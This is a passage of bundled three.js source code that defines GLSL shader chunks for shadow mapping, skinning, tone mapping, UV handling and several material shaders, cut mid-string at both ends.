all( frustumTestVec );\n\t\tif ( frustumTest ) {\n\t\t#if defined( SHADOWMAP_TYPE_PCF )\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\t\t\tfloat dx0 = - texelSize.x * shadowRadius;\n\t\t\tfloat dy0 = - texelSize.y * shadowRadius;\n\t\t\tfloat dx1 = + texelSize.x * shadowRadius;\n\t\t\tfloat dy1 = + texelSize.y * shadowRadius;\n\t\t\tfloat dx2 = dx0 / 2.0;\n\t\t\tfloat dy2 = dy0 / 2.0;\n\t\t\tfloat dx3 = dx1 / 2.0;\n\t\t\tfloat dy3 = dy1 / 2.0;\n\t\t\tshadow = (\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\n\t\t\t) * ( 1.0 / 17.0 );\n\t\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\t\t\tfloat dx = texelSize.x;\n\t\t\tfloat dy = texelSize.y;\n\t\t\tvec2 uv = shadowCoord.xy;\n\t\t\tvec2 f = fract( uv * shadowMapSize + 0.5 );\n\t\t\tuv -= f * texelSize;\n\t\t\tshadow = (\n\t\t\t\ttexture2DCompare( shadowMap, uv, shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, uv + vec2( dx, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, uv + vec2( 0.0, dy ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, uv + texelSize, shadowCoord.z ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( -dx, 0.0 ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, 0.0 ), shadowCoord.z ),\n\t\t\t\t\t f.x ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( -dx, dy ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, dy ), shadowCoord.z ),\n\t\t\t\t\t f.x ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( 0.0, -dy ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( 0.0, 2.0 * dy ), shadowCoord.z ),\n\t\t\t\t\t f.y ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( dx, -dy ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( dx, 2.0 * dy ), shadowCoord.z ),\n\t\t\t\t\t f.y ) +\n\t\t\t\tmix( mix( texture2DCompare( shadowMap, uv + vec2( -dx, -dy ), shadowCoord.z ), \n\t\t\t\t\t\t  texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, -dy ), shadowCoord.z ),\n\t\t\t\t\t\t  f.x ),\n\t\t\t\t\t mix( texture2DCompare( shadowMap, uv + vec2( -dx, 2.0 * dy ), shadowCoord.z ), \n\t\t\t\t\t\t  texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, 2.0 * dy ), shadowCoord.z ),\n\t\t\t\t\t\t  f.x ),\n\t\t\t\t\t f.y )\n\t\t\t) * ( 1.0 / 9.0 );\n\t\t#elif defined( SHADOWMAP_TYPE_VSM )\n\t\t\tshadow = VSMShadow( shadowMap, shadowCoord.xy, shadowCoord.z );\n\t\t#else\n\t\t\tshadow = texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\n\t\t#endif\n\t\t}\n\t\treturn shadow;\n\t}\n\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\n\t\tvec3 absV = abs( v );\n\t\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\n\t\tabsV *= scaleToCube;\n\t\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\n\t\tvec2 planar = v.xy;\n\t\tfloat almostATexel = 1.5 * texelSizeY;\n\t\tfloat almostOne = 1.0 - almostATexel;\n\t\tif ( absV.z >= almostOne ) {\n\t\t\tif ( v.z > 0.0 )\n\t\t\t\tplanar.x = 4.0 - v.x;\n\t\t} else if ( absV.x >= almostOne ) {\n\t\t\tfloat signX = sign( v.x );\n\t\t\tplanar.x = v.z * signX + 2.0 * signX;\n\t\t} else if ( absV.y >= almostOne ) {\n\t\t\tfloat signY = sign( v.y );\n\t\t\tplanar.x = v.x + 2.0 * signY + 2.0;\n\t\t\tplanar.y = v.z * signY - 2.0;\n\t\t}\n\t\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\n\t}\n\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {\n\t\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\n\t\tvec3 lightToPosition = shadowCoord.xyz;\n\t\tfloat dp = ( length( lightToPosition ) - shadowCameraNear ) / ( shadowCameraFar - shadowCameraNear );\t\tdp += shadowBias;\n\t\tvec3 bd3D = normalize( lightToPosition );\n\t\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT ) || defined( SHADOWMAP_TYPE_VSM )\n\t\t\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\n\t\t\treturn (\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\n\t\t\t) * ( 1.0 / 9.0 );\n\t\t#else\n\t\t\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\n\t\t#endif\n\t}\n#endif", shadowmap_pars_vertex: "#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tstruct DirectionalLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tstruct SpotLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tstruct PointLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t\tfloat shadowCameraNear;\n\t\t\tfloat shadowCameraFar;\n\t\t};\n\t\tuniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];\n\t#endif\n#endif", shadowmap_vertex: "#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0 || NUM_SPOT_LIGHT_SHADOWS > 0 || NUM_POINT_LIGHT_SHADOWS > 0\n\t\tvec3 shadowWorldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\n\t\tvec4 shadowWorldPosition;\n\t#endif\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {\n\t\tshadowWorldPosition = worldPosition + vec4( shadowWorldNormal * directionalLightShadows[ i ].shadowNormalBias, 0 );\n\t\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * shadowWorldPosition;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {\n\t\tshadowWorldPosition = worldPosition + vec4( shadowWorldNormal * spotLightShadows[ i ].shadowNormalBias, 0 );\n\t\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * shadowWorldPosition;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {\n\t\tshadowWorldPosition = worldPosition + vec4( shadowWorldNormal * pointLightShadows[ i ].shadowNormalBias, 0 );\n\t\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * shadowWorldPosition;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n#endif", shadowmask_pars_fragment: "float getShadowMask() {\n\tfloat shadow = 1.0;\n\t#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\tDirectionalLightShadow directionalLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {\n\t\tdirectionalLight = directionalLightShadows[ i ];\n\t\tshadow *= receiveShadow ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\tSpotLightShadow spotLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {\n\t\tspotLight = spotLightShadows[ i ];\n\t\tshadow *= receiveShadow ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\tPointLightShadow pointLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {\n\t\tpointLight = pointLightShadows[ i ];\n\t\tshadow *= receiveShadow ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#endif\n\treturn shadow;\n}", skinbase_vertex: "#ifdef USE_SKINNING\n\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\n\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\n\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\n\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\n#endif", skinning_pars_vertex: "#ifdef USE_SKINNING\n\tuniform mat4 bindMatrix;\n\tuniform mat4 bindMatrixInverse;\n\t#ifdef BONE_TEXTURE\n\t\tuniform highp sampler2D boneTexture;\n\t\tuniform int boneTextureSize;\n\t\tmat4 getBoneMatrix( const in float i ) {\n\t\t\tfloat j = i * 4.0;\n\t\t\tfloat x = mod( j, float( boneTextureSize ) );\n\t\t\tfloat y = floor( j / float( boneTextureSize ) );\n\t\t\tfloat dx = 1.0 / float( boneTextureSize );\n\t\t\tfloat dy = 1.0 / float( boneTextureSize );\n\t\t\ty = dy * ( y + 0.5 );\n\t\t\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\n\t\t\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\n\t\t\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\n\t\t\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\n\t\t\tmat4 bone = mat4( v1, v2, v3, v4 );\n\t\t\treturn bone;\n\t\t}\n\t#else\n\t\tuniform mat4 boneMatrices[ MAX_BONES ];\n\t\tmat4 getBoneMatrix( const in float i ) {\n\t\t\tmat4 bone = boneMatrices[ int(i) ];\n\t\t\treturn bone;\n\t\t}\n\t#endif\n#endif", skinning_vertex: "#ifdef USE_SKINNING\n\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\n\tvec4 skinned = vec4( 0.0 );\n\tskinned += boneMatX * skinVertex * skinWeight.x;\n\tskinned += boneMatY * skinVertex * skinWeight.y;\n\tskinned += boneMatZ * skinVertex * skinWeight.z;\n\tskinned += boneMatW * skinVertex * skinWeight.w;\n\ttransformed = ( bindMatrixInverse * skinned ).xyz;\n#endif", skinnormal_vertex: "#ifdef USE_SKINNING\n\tmat4 skinMatrix = mat4( 0.0 );\n\tskinMatrix += skinWeight.x * boneMatX;\n\tskinMatrix += skinWeight.y * boneMatY;\n\tskinMatrix += skinWeight.z * boneMatZ;\n\tskinMatrix += skinWeight.w * boneMatW;\n\tskinMatrix = bindMatrixInverse * skinMatrix * bindMatrix;\n\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\n\t#ifdef USE_TANGENT\n\t\tobjectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;\n\t#endif\n#endif", specularmap_fragment: "float specularStrength;\n#ifdef USE_SPECULARMAP\n\tvec4 texelSpecular = texture2D( specularMap, vUv );\n\tspecularStrength = texelSpecular.r;\n#else\n\tspecularStrength = 1.0;\n#endif", specularmap_pars_fragment: "#ifdef USE_SPECULARMAP\n\tuniform sampler2D specularMap;\n#endif", tonemapping_fragment: "#if defined( TONE_MAPPING )\n\tgl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\n#endif", tonemapping_pars_fragment: "#ifndef saturate\n#define saturate(a) clamp( a, 0.0, 1.0 )\n#endif\nuniform float toneMappingExposure;\nvec3 LinearToneMapping( vec3 color ) {\n\treturn toneMappingExposure * color;\n}\nvec3 ReinhardToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\treturn saturate( color / ( vec3( 1.0 ) + color ) );\n}\nvec3 OptimizedCineonToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\tcolor = max( vec3( 0.0 ), color - 0.004 );\n\treturn pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\n}\nvec3 RRTAndODTFit( vec3 v ) {\n\tvec3 a = v * ( v + 0.0245786 ) - 0.000090537;\n\tvec3 b = v * ( 0.983729 * v + 0.4329510 ) + 0.238081;\n\treturn a / b;\n}\nvec3 ACESFilmicToneMapping( vec3 color ) {\n\tconst mat3 ACESInputMat = mat3(\n\t\tvec3( 0.59719, 0.07600, 0.02840 ),\t\tvec3( 0.35458, 0.90834, 0.13383 ),\n\t\tvec3( 0.04823, 0.01566, 0.83777 )\n\t);\n\tconst mat3 ACESOutputMat = mat3(\n\t\tvec3(  1.60475, -0.10208, -0.00327 ),\t\tvec3( -0.53108,  1.10813, -0.07276 ),\n\t\tvec3( -0.07367, -0.00605,  1.07602 )\n\t);\n\tcolor *= toneMappingExposure / 0.6;\n\tcolor = ACESInputMat * color;\n\tcolor = RRTAndODTFit( color );\n\tcolor = ACESOutputMat * color;\n\treturn saturate( color );\n}\nvec3 CustomToneMapping( vec3 color ) { return color; }", transmissionmap_fragment: "#ifdef USE_TRANSMISSIONMAP\n\ttotalTransmission *= texture2D( transmissionMap, vUv ).r;\n#endif", transmissionmap_pars_fragment: "#ifdef USE_TRANSMISSIONMAP\n\tuniform sampler2D transmissionMap;\n#endif", uv_pars_fragment: "#if ( defined( USE_UV ) && ! defined( UVS_VERTEX_ONLY ) )\n\tvarying vec2 vUv;\n#endif", uv_pars_vertex: "#ifdef USE_UV\n\t#ifdef UVS_VERTEX_ONLY\n\t\tvec2 vUv;\n\t#else\n\t\tvarying vec2 vUv;\n\t#endif\n\tuniform mat3 uvTransform;\n#endif", uv_vertex: "#ifdef USE_UV\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n#endif", uv2_pars_fragment: "#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tvarying vec2 vUv2;\n#endif", uv2_pars_vertex: "#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tattribute vec2 uv2;\n\tvarying vec2 vUv2;\n\tuniform mat3 uv2Transform;\n#endif", uv2_vertex: "#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tvUv2 = ( uv2Transform * vec3( uv2, 1 ) ).xy;\n#endif", worldpos_vertex: "#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP )\n\tvec4 worldPosition = vec4( transformed, 1.0 );\n\t#ifdef USE_INSTANCING\n\t\tworldPosition = instanceMatrix * worldPosition;\n\t#endif\n\tworldPosition = modelMatrix * worldPosition;\n#endif", background_frag: "uniform sampler2D t2D;\nvarying vec2 vUv;\nvoid main() {\n\tvec4 texColor = texture2D( t2D, vUv );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}", background_vert: "varying vec2 vUv;\nuniform mat3 uvTransform;\nvoid main() {\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n\tgl_Position = vec4( position.xy, 1.0, 1.0 );\n}", cube_frag: "#include <envmap_common_pars_fragment>\nuniform float opacity;\nvarying vec3 vWorldDirection;\n#include <cube_uv_reflection_fragment>\nvoid main() {\n\tvec3 vReflect = vWorldDirection;\n\t#include <envmap_fragment>\n\tgl_FragColor = envColor;\n\tgl_FragColor.a *= opacity;\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}", cube_vert: "varying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\tgl_Position.z = gl_Position.w;\n}", depth_frag: "#if DEPTH_PACKING == 3200\n\tuniform float opacity;\n#endif\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvarying vec2 vHighPrecisionZW;\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( 1.0 );\n\t#if DEPTH_PACKING == 3200\n\t\tdiffuseColor.a = opacity;\n\t#endif\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <logdepthbuf_fragment>\n\tfloat fragCoordZ = 0.5 * vHighPrecisionZW[0] / vHighPrecisionZW[1] + 0.5;\n\t#if DEPTH_PACKING == 3200\n\t\tgl_FragColor = vec4( vec3( 1.0 - fragCoordZ ), opacity );\n\t#elif DEPTH_PACKING == 3201\n\t\tgl_FragColor = packDepthToRGBA( fragCoordZ );\n\t#endif\n}", depth_vert: "#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvarying vec2 vHighPrecisionZW;\nvoid main() {\n\t#include <uv_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_DISPLACEMENTMAP\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvHighPrecisionZW = gl_Position.zw;\n}", distanceRGBA_frag: "#define DISTANCE\nuniform vec3 referencePosition;\nuniform float nearDistance;\nuniform float farDistance;\nvarying vec3 vWorldPosition;\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main () {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( 1.0 );\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\tfloat dist = length( vWorldPosition - referencePosition );\n\tdist = ( dist - nearDistance ) / ( farDistance - nearDistance );\n\tdist = saturate( dist );\n\tgl_FragColor = packDepthToRGBA( dist );\n}", distanceRGBA_vert: "#define DISTANCE\nvarying vec3 vWorldPosition;\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_DISPLACEMENTMAP\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\tvWorldPosition = worldPosition.xyz;\n}", equirect_frag: "uniform sampler2D tEquirect;\nvarying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvec3 direction = normalize( vWorldDirection );\n\tvec2 sampleUV = equirectUv( direction );\n\tvec4 texColor = texture2D( tEquirect, sampleUV );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}", equirect_vert: "varying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n}", linedashed_frag: "uniform vec3 diffuse;\nuniform float opacity;\nuniform float dashSize;\nuniform float totalSize;\nvarying float vLineDistance;\n#include <common>\n#include <color_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\n\t\tdiscard;\n\t}\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <color_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n}", linedashed_vert: "uniform float scale;\nattribute float lineDistance;\nvarying float vLineDistance;\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\tvLineDistance = scale * lineDistance;\n\t#include <color_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n}", meshbasic_frag: "uniform vec3 diffuse;\nuniform float opacity;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <cube_uv_reflection_fragment>\n#include <fog_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\t#ifdef USE_LIGHTMAP\n\t\n\t\tvec4 lightMapTexel= texture2D( lightMap, vUv2 );\n\t\treflectedLight.indirectDiffuse += lightMapTexelToLinear( lightMapTexel ).rgb * lightMapIntensity;\n\t#else\n\t\treflectedLight.indirectDiffuse += vec3( 1.0 );\n\t#endif\n\t#include <aomap_fragment>\n\treflectedLight.indirectDiffuse *= diffuseColor.rgb;\n\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}", meshbasic_vert: "#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_ENVMAP\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <envmap_vertex>\n\t#include <fog_vertex>\n}", meshlambert_frag: "uniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float opacity;\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include 